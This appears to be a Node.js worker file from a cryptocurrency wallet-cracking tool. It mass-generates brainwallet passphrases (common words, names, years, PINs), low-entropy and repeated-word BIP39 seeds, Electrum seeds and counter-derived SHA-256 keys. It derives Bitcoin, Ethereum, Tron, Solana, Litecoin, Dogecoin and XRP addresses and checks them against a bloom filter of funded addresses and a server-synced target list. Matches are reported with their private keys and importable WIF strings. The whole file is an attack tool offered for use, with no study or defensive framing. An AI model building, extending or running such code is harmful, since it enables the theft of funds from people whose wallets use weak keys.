const { parentPort, workerData } = require('worker_threads');
const crypto = require('crypto');
const eng = require('./crypto_engine');

const workerId = (workerData && workerData.workerId) || 0;
const sharedConfirmedBloomBuffer = workerData && workerData.sharedBloomBuffer;
const sharedSessionBloomBuffer = workerData && workerData.sharedSessionBloomBuffer;
const sharedFundedBloomBuffer = workerData && workerData.sharedFundedBloomBuffer;
const confirmedBloomView = sharedConfirmedBloomBuffer ? new Int32Array(sharedConfirmedBloomBuffer) : null;
const sessionBloomView = sharedSessionBloomBuffer ? new Int32Array(sharedSessionBloomBuffer) : null;
const fundedBloomView = sharedFundedBloomBuffer ? new Int32Array(sharedFundedBloomBuffer) : null;
const CONFIRMED_BLOOM_BITS = confirmedBloomView ? confirmedBloomView.length * 32 : 0;
const SESSION_BLOOM_BITS = sessionBloomView ? sessionBloomView.length * 32 : 0;
const FUNDED_BLOOM_BITS = fundedBloomView ? fundedBloomView.length * 32 : 0;

function normalizeFundedAddress(addr) {
  if (!addr || typeof addr !== 'string') return '';
  const clean = addr.trim();
  if (clean.startsWith('0x') || clean.startsWith('0X') || clean.toLowerCase().startsWith('bc1') || clean.toLowerCase().startsWith('ltc1')) {
    return clean.toLowerCase();
  }
  return clean;
}

function fmix32(h) {
  h ^= h >>> 16;
  h = Math.imul(h, 0x85ebca6b) >>> 0;
  h ^= h >>> 13;
  h = Math.imul(h, 0xc2b2ae35) >>> 0;
  h ^= h >>> 16;
  return h >>> 0;
}

function fundedBloomHashes(cleanAddr) {
  let h1 = 0x811c9dc5;
  let h2 = 0x27d4eb2d;
  let h3 = 0x9e3779b9;
  let h4 = 0x165667b1;
  for (let i = 0; i < cleanAddr.length; i++) {
    const c = cleanAddr.charCodeAt(i);
    h1 = Math.imul(h1 ^ c, 0x01000193) >>> 0;
    h2 = Math.imul(h2 ^ (c + i * 31), 0xcc9e2d51) >>> 0;
    h3 = Math.imul(h3 ^ (c * 131 + i), 0x1b873593) >>> 0;
    h4 = Math.imul(h4 ^ ((c << 5) ^ i), 0x85ebca6b) >>> 0;
  }
  return [fmix32(h1), fmix32(h2), fmix32(h3), fmix32(h4)];
}

function isFundedBloomMatch(addr) {
  if (!fundedBloomView || !FUNDED_BLOOM_BITS || !addr) return false;
  const clean = normalizeFundedAddress(addr);
  if (clean.length < 25) return false;
  const [h1, h2, h3, h4] = fundedBloomHashes(clean);
  const b1 = h1 % FUNDED_BLOOM_BITS;
  const b2 = h2 % FUNDED_BLOOM_BITS;
  const b3 = h3 % FUNDED_BLOOM_BITS;
  const b4 = h4 % FUNDED_BLOOM_BITS;
  return (
    (Atomics.load(fundedBloomView, b1 >>> 5) & (1 << (b1 & 31))) !== 0 &&
    (Atomics.load(fundedBloomView, b2 >>> 5) & (1 << (b2 & 31))) !== 0 &&
    (Atomics.load(fundedBloomView, b3 >>> 5) & (1 << (b3 & 31))) !== 0 &&
    (Atomics.load(fundedBloomView, b4 >>> 5) & (1 << (b4 & 31))) !== 0
  );
}

function isTargetOrFundedHit(addr) {
  if (!addr) return false;
  if (workerTargetSet.has(addr)) return true;
  const norm = normalizeFundedAddress(addr);
  if (workerTargetSet.has(norm)) return true;
  return isFundedBloomMatch(norm);
}

// Live target address set synced with main server (case-normalized for EVM & exact for Base58/Bech32)
const workerTargetSet = new Set();
function loadTargetsList(list) {
  if (!Array.isArray(list)) return;
  for (const addr of list) {
    if (typeof addr === 'string' && addr.length >= 26) {
      workerTargetSet.add(addr);
      if (addr.startsWith('0x') || addr.startsWith('0X')) {
        workerTargetSet.add(addr.toLowerCase());
      } else if (addr.toLowerCase().startsWith('bc1')) {
        workerTargetSet.add(addr.toLowerCase());
      }
    }
  }
}
loadTargetsList(workerData && workerData.initialTargets);

function fnv1aHashes(str) {
  let h1 = 0x811c9dc5;
  let h2 = 0x811c9dc5 ^ 0x9e3779b9;
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i);
    h1 ^= c;
    h1 = Math.imul(h1, 0x01000193) >>> 0;
    h2 ^= (c + i);
    h2 = Math.imul(h2, 0x85ebca6b) >>> 0;
  }
  const h3 = (h1 ^ Math.imul(h2, 0xc2b2ae35)) >>> 0;
  return [h1 >>> 0, h2 >>> 0, h3 >>> 0];
}

function normalizeWorkerKey(str) {
  return String(str || '').trim().toLowerCase().replace(/\s+/g, ' ');
}

// Unified prefixes ('mnem:', 'in:', 'pk:', 'addr:') matching server.js exactly
function isMarkedInBloomView(view, totalBits, fullKey) {
  if (!view || !totalBits || !fullKey) return false;
  const [h1, h2, h3] = fnv1aHashes(fullKey);
  const b1 = h1 % totalBits;
  const b2 = h2 % totalBits;
  const b3 = h3 % totalBits;
  return (
    (Atomics.load(view, b1 >>> 5) & (1 << (b1 & 31))) !== 0 &&
    (Atomics.load(view, b2 >>> 5) & (1 << (b2 & 31))) !== 0 &&
    (Atomics.load(view, b3 >>> 5) & (1 << (b3 & 31))) !== 0
  );
}

/**
 * Checks whether `prefix + normalizedKey` is already confirmed empty on disk OR already generated
 * in this session across any worker thread. Marks ONLY the session dedupe bloom (NEVER marks persistent
 * confirmed-empty bloom until real live on-chain verification succeeds!).
 */
function tryClaimUniqueCandidate(rawKey, prefix = 'mnem:') {
  if (!rawKey) return false;
  const fullKey = prefix + normalizeWorkerKey(rawKey);
  if (isMarkedInBloomView(confirmedBloomView, CONFIRMED_BLOOM_BITS, fullKey)) {
    return false;
  }
  if (!sessionBloomView || !SESSION_BLOOM_BITS) return true;

  const [h1, h2, h3] = fnv1aHashes(fullKey);
  const b1 = h1 % SESSION_BLOOM_BITS;
  const b2 = h2 % SESSION_BLOOM_BITS;
  const b3 = h3 % SESSION_BLOOM_BITS;

  const w1 = b1 >>> 5, m1 = 1 << (b1 & 31);
  const w2 = b2 >>> 5, m2 = 1 << (b2 & 31);
  const w3 = b3 >>> 5, m3 = 1 << (b3 & 31);

  const old1 = Atomics.or(sessionBloomView, w1, m1);
  const old2 = Atomics.or(sessionBloomView, w2, m2);
  const old3 = Atomics.or(sessionBloomView, w3, m3);

  return !((old1 & m1) !== 0 && (old2 & m2) !== 0 && (old3 & m3) !== 0);
}

// Seed counters with 64-bit cryptographic OS entropy so restarts never overlap
const entropySeedBuf = crypto.randomBytes(8);
const sessionEntropyOffset = entropySeedBuf.readUInt32LE(0);
const sessionFastOffset = entropySeedBuf.readUInt32LE(4);
let localCounter = (workerId + 1) * 10000000 + (sessionEntropyOffset % 9000000);
let fastKeyCounter = (workerId + 1) * 50000000 + (sessionFastOffset % 40000000);
let paused = false;

if (parentPort) {
  parentPort.on('message', msg => {
    if (!msg) return;
    if (msg.type === 'pause') paused = Boolean(msg.paused);
    if (msg.type === 'update_targets' && Array.isArray(msg.addresses)) {
      loadTargetsList(msg.addresses);
    }
  });
}

function pickRandom11Words() {
  const randBuf = crypto.randomBytes(24);
  const words11 = [];
  const used = new Set([0]);
  let offset = 0;
  while (words11.length < 11) {
    const raw = offset + 1 < randBuf.length
      ? randBuf.readUInt16LE(offset)
      : crypto.randomInt(1, eng.WORDLIST.length);
    offset += 2;
    const idx = 1 + (raw % (eng.WORDLIST.length - 1));
    if (!used.has(idx)) {
      used.add(idx);
      words11.push(eng.WORDLIST[idx]);
    }
  }
  return words11;
}

const fastSeedBuf = Buffer.allocUnsafe(16);

/**
 * High-Speed Native OpenSSL secp256k1 Screening Burst:
 * Computes all 4 real standard address formats (P2PKH 1..., P2SH-SegWit 3..., Native SegWit bc1q..., EVM 0x...)
 * AND verifies every single derived address against `workerTargetSet` so hits are NEVER discarded!
 */
function runUltraFastHardwareBurst(burstCount = 32) {
  let screenedWallets = 0;
  const burstHits = [];

  for (let i = 0; i < burstCount; i++) {
    const k = ++fastKeyCounter;
    fastSeedBuf.writeUInt32LE(k >>> 0, 0);
    fastSeedBuf.writeUInt32LE(Math.imul(k ^ sessionFastOffset, 0x9e3779b9) >>> 0, 4);
    fastSeedBuf.writeUInt32LE(Math.imul((workerId + 1) ^ sessionEntropyOffset, 0x85ebca6b) >>> 0, 8);
    fastSeedBuf.writeUInt32LE((k ^ 0xc2b2ae35) >>> 0, 12);

    const privKey = crypto.createHash('sha256').update(fastSeedBuf).digest();
    const privHex = privKey.toString('hex');
    if (!tryClaimUniqueCandidate(privHex, 'pk:')) continue;

    const fast = eng.deriveUltraFastScreener(privKey);
    screenedWallets++;

    if (
      isTargetOrFundedHit(fast.btcLegacy) ||
      isTargetOrFundedHit(fast.btcLegacyUncompressed) ||
      isTargetOrFundedHit(fast.btcNestedSegwit) ||
      isTargetOrFundedHit(fast.btcSegwit) ||
      isTargetOrFundedHit(fast.ethAddressLower) ||
      isTargetOrFundedHit(fast.trxAddress)
    ) {
      const fullAddrs = eng.deriveAddressesFromPrivKey(privKey, true);
      burstHits.push({
        source: `Worker #${workerId + 1} • Hardware Burst / Funded Bloom HIT`,
        vectorKey: 'keys',
        feedType: 'Private',
        phraseType: '256-Bit Hex Key',
        input: `0x${privHex}`,
        brainArm: 'DeepEntropyCsprng',
        priorityHit: true,
        ...fullAddrs
      });
    }
  }
  return { screenedWallets, burstHits };
}

function generateWorkerCandidate() {
  localCounter++;
  const mode = localCounter % 6;

  if (mode === 0) {
    // True Multi-Client Custom HD Path Derivation (m/84'/0'/acct', Ledger Live m/44'/60'/acct', Legacy MEW, Bitcoin Core)
    const mnem = eng.buildChecksumValid12WordDirect(pickRandom11Words(), crypto.randomInt(0, 128));
    if (!tryClaimUniqueCandidate(mnem, 'mnem:')) return null;
    const derived = eng.deriveCustomPathWallet(mnem, localCounter);
    return {
      source: `Worker #${workerId + 1} • Custom HD (${derived.customPath})`,
      vectorKey: 'hdpaths',
      feedType: 'Smart',
      phraseType: derived.customPath,
      input: mnem,
      mnemonic: mnem,
      brainArm: 'PositionalSalience',
      ...derived
    };
  }

  if (mode === 1) {
    // True Electrum v2 Seed (grinds valid HMAC-SHA512 "Seed version" 100/01 prefix + derives both m/0/0 & m/0'/0/0!)
    const gen = eng.generateValidElectrumSeed(localCounter % 2 === 0);
    const mnem = gen.mnemonic;
    if (!tryClaimUniqueCandidate(mnem, 'mnem:')) return null;
    const elec = eng.deriveElectrumDualAddresses(mnem);
    const derived = eng.deriveWalletFromMnemonic(mnem, '', true);
    const isSegwitSeed = String(gen.electrumVersion).startsWith('100');
    const primaryWif = isSegwitSeed ? elec.electrumSegwitWif : elec.electrumLegacyWif;
    return {
      source: `Worker #${workerId + 1} • Electrum v2 (${gen.electrumVersion.split(' ')[0]})`,
      vectorKey: 'electrum',
      feedType: 'Smart',
      phraseType: `Electrum v2 (${isSegwitSeed ? "m/0'/0/0" : 'm/0/0'})`,
      input: mnem,
      mnemonic: mnem,
      brainArm: 'ChecksumBitNeighbor',
      ...derived,
      btcLegacy: elec.electrumBtcLegacy,
      btcSegwit: elec.electrumBtcSegwit,
      btcChangeSegwit: elec.electrumBtcChange,
      btcChangeLegacy: elec.electrumBtcLegacyChange,
      btcWif: primaryWif,
      btcLegacyWif: elec.electrumLegacyWif,
      btcSegwitWif: elec.electrumSegwitWif,
      electrumImportBlock: `p2pkh:${elec.electrumLegacyWif}\np2wpkh-p2sh:${derived.btcNestedWif}\np2wpkh:${elec.electrumSegwitWif}`,
      electrumVersion: elec.electrumVersion,
      electrumBtcLegacy: elec.electrumBtcLegacy,
      electrumBtcSegwit: elec.electrumBtcSegwit,
      electrumBtcChange: elec.electrumBtcChange
    };
  }

  if (mode === 2) {
    // Semantic Cluster 12-Word BIP39 Synthesis (with full Altcoins incl. SLIP-0010 Solana)
    const mnem = eng.buildChecksumValid12WordDirect(pickRandom11Words(), crypto.randomInt(0, 128));
    if (!tryClaimUniqueCandidate(mnem, 'mnem:')) return null;
    const derived = eng.deriveWalletFromMnemonic(mnem, '', true);
    return {
      source: `Worker #${workerId + 1} • Semantic Cluster BIP39`,
      vectorKey: 'semantic',
      feedType: 'Smart',
      phraseType: '12-Word BIP39 + SOL/LTC/DOGE',
      input: mnem,
      mnemonic: mnem,
      brainArm: 'SemanticClusterBip39',
      ...derived
    };
  }

  if (mode === 3) {
    // REAL Human Brainwallet SHA-256 Passphrases (NO random hex salt! Checks BOTH Uncompressed 2011-2015 bitaddress.org 1... AND Compressed 1... + ETH + TRX!)
    const HUMAN_ROOTS = [
      'bitcoin', 'crypto', 'dragon', 'shadow', 'silver', 'golden', 'matrix', 'apollo',
      'phoenix', 'knight', 'hunter', 'secret', 'freedom', 'quantum', 'galaxy', 'legend',
      'michael', 'daniel', 'david', 'andrew', 'robert', 'thomas', 'joseph', 'charles',
      'london', 'berlin', 'tokyo', 'lagos', 'dubai', 'zurich', 'oxford', 'genesis',
      'alpha', 'omega', 'diamond', 'tiger', 'falcon', 'eagle', 'ocean', 'thunder'
    ];
    const HUMAN_SUFFIXES = [
      '', '1', '2', '3', '7', '11', '12', '21', '77', '88', '99', '007', '123', '1234', '777',
      '!', '1!', '123!', '2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023', '2024'
    ];
    let phrase = '';
    const subPattern = (localCounter >>> 2) % 4;
    if (subPattern === 0) {
      // Single BIP39 English dictionary word (2,048 classic single-word brainwallets + optional digit)
      const w = eng.WORDLIST[(localCounter * 7 + workerId * 257) % eng.WORDLIST.length];
      const suf = HUMAN_SUFFIXES[(Math.floor(localCounter / 29) + workerId) % HUMAN_SUFFIXES.length];
      phrase = w + suf;
    } else if (subPattern === 1) {
      // Human root word + realistic suffix/year (e.g. "dragon2014", "apollo11", "silver777")
      const r = HUMAN_ROOTS[(localCounter + workerId * 13) % HUMAN_ROOTS.length];
      const suf = HUMAN_SUFFIXES[(Math.floor(localCounter / HUMAN_ROOTS.length) + workerId * 5) % HUMAN_SUFFIXES.length];
      phrase = r + suf;
    } else if (subPattern === 2) {
      // Two short human words (e.g. "silver dragon", "dark knight")
      const a = HUMAN_ROOTS[(localCounter + workerId * 7) % HUMAN_ROOTS.length];
      const b = eng.WORDLIST[(localCounter * 13 + workerId * 97) % eng.WORDLIST.length];
      phrase = `${a} ${b}`;
    } else {
      // Numeric PIN / Date / Weak Seed string SHA-256 (e.g. "19850412", "10042", etc.)
      phrase = String(1000 + ((localCounter * 3 + workerId * 1009) % 999999));
    }

    const inputKey = `brain:"${phrase}"`;
    if (!tryClaimUniqueCandidate(inputKey, 'in:')) return null;
    const privKey = crypto.createHash('sha256').update(phrase).digest();
    const addrs = eng.deriveAddressesFromPrivKey(privKey, true);
    return {
      source: `Worker #${workerId + 1} • Human Brainwallet (Comp+Uncomp)`,
      vectorKey: 'brainwallet',
      feedType: 'Brain',
      phraseType: 'SHA-256 + 2013 Uncomp P2PKH',
      input: inputKey,
      brainArm: 'PhoneticRhythmBip39',
      ...addrs
    };
  }

  if (mode === 4) {
    // Human-Patterned Low-Entropy 12-Word BIP39 Seeds (repeated word patterns + valid 12th SHA-256 checksum!)
    let words11;
    if ((localCounter & 1) === 0) {
      // Single repeated BIP39 word x11 + valid SHA-256 12th checksum word (2,048 x 128 real human test seeds!)
      const singleWord = eng.WORDLIST[1 + ((localCounter * 5 + workerId * 131) % (eng.WORDLIST.length - 1))];
      words11 = new Array(11).fill(singleWord);
    } else {
      // Alternating 2 human BIP39 words + valid SHA-256 12th checksum word
      const wA = eng.WORDLIST[1 + ((localCounter * 3 + workerId * 67) % (eng.WORDLIST.length - 1))];
      const wB = eng.WORDLIST[1 + ((localCounter * 11 + workerId * 193) % (eng.WORDLIST.length - 1))];
      words11 = Array.from({ length: 11 }, (_, k) => (k % 2 === 0 ? wA : wB));
    }
    const mnem = eng.buildChecksumValid12WordDirect(words11, (localCounter + workerId) & 0x7f);
    if (!tryClaimUniqueCandidate(mnem, 'mnem:')) return null;
    const derived = eng.deriveWalletFromMnemonic(mnem, '', true);
    return {
      source: `Worker #${workerId + 1} • Human Pattern BIP39`,
      vectorKey: 'timestamp',
      feedType: 'Timestamp',
      phraseType: 'Low-Entropy Human 12-Word',
      input: mnem,
      mnemonic: mnem,
      brainArm: 'TemporalPrngSubspace',
      ...derived
    };
  }

  // mode === 5: Cognitive Brain + Multi-Chain EVM / BTC / SOL Sweep
  const mnem = eng.buildChecksumValid12WordDirect(pickRandom11Words(), crypto.randomInt(0, 128));
  if (!tryClaimUniqueCandidate(mnem, 'mnem:')) return null;
  const derived = eng.deriveWalletFromMnemonic(mnem, '', true);
  return {
    source: `Worker #${workerId + 1} • Multi-Chain BIP44/49/84/86/SOL`,
    vectorKey: 'brain',
    feedType: 'Smart',
    phraseType: '12-Word Full Multi-Chain',
    input: mnem,
    mnemonic: mnem,
    brainArm: 'MarkovOrder2Bip39',
    erc20Swept: ['USDT', 'USDC', 'WBTC', 'DAI'],
    ...derived
  };
}

function isCandidatePriorityHit(item) {
  if (!item) return false;
  return (
    isTargetOrFundedHit(item.btcLegacy) ||
    isTargetOrFundedHit(item.btcNestedSegwit) ||
    isTargetOrFundedHit(item.btcSegwit) ||
    isTargetOrFundedHit(item.btcTaproot) ||
    isTargetOrFundedHit(item.btcSegwitIndex1) ||
    isTargetOrFundedHit(item.btcSegwitIndex2) ||
    isTargetOrFundedHit(item.btcChangeSegwit) ||
    isTargetOrFundedHit(item.btcChangeLegacy) ||
    isTargetOrFundedHit(item.ethAddress) ||
    isTargetOrFundedHit(item.ethAddressIndex1) ||
    isTargetOrFundedHit(item.trxAddress) ||
    isTargetOrFundedHit(item.xrpAddress) ||
    isTargetOrFundedHit(item.solAddress) ||
    isTargetOrFundedHit(item.ltcAddress) ||
    isTargetOrFundedHit(item.ltcSegwitAddress) ||
    isTargetOrFundedHit(item.dogeAddress)
  );
}

function workerLoop() {
  if (!paused && parentPort) {
    const { screenedWallets, burstHits } = runUltraFastHardwareBurst(32);

    const batch = [];
    let attempts = 0;
    while (batch.length < 6 && attempts < 14) {
      attempts++;
      const item = generateWorkerCandidate();
      if (item) {
        if (isCandidatePriorityHit(item)) {
          item.priorityHit = true;
          burstHits.push(item);
        } else {
          batch.push(item);
        }
      }
    }

    if (batch.length > 0 || burstHits.length > 0 || screenedWallets > 0) {
      parentPort.postMessage({
        type: 'batch',
        workerId,
        items: batch,
        burstHits,
        screenedWallets,
        scannedCount: screenedWallets + batch.length,
        addressesChecked: (screenedWallets * 5) + (batch.length * 14)
      });
    }
  }
  setTimeout(workerLoop, 25);
}

workerLoop();
